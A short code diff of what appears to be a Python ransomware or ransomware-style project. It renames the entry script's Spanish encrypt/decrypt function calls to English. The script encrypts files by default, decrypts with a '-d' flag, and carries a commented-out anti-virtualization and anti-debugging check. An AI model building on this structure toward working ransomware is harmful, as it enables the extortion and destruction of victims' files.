@@ -5,10 +5,10 @@ import decrypt
 
 def main():
     if len(sys.argv) > 1 and sys.argv[1] == "-d":
-        decrypt.descifrar_archivos()
+        decrypt.decrypt_files()
     else:
         #antianalysis.check_virtualization_and_debbuging() 
-        encrypt.cifrar_archivos()
+        encrypt.encrypt_files()
 
 if __name__ == "__main__":
     main()
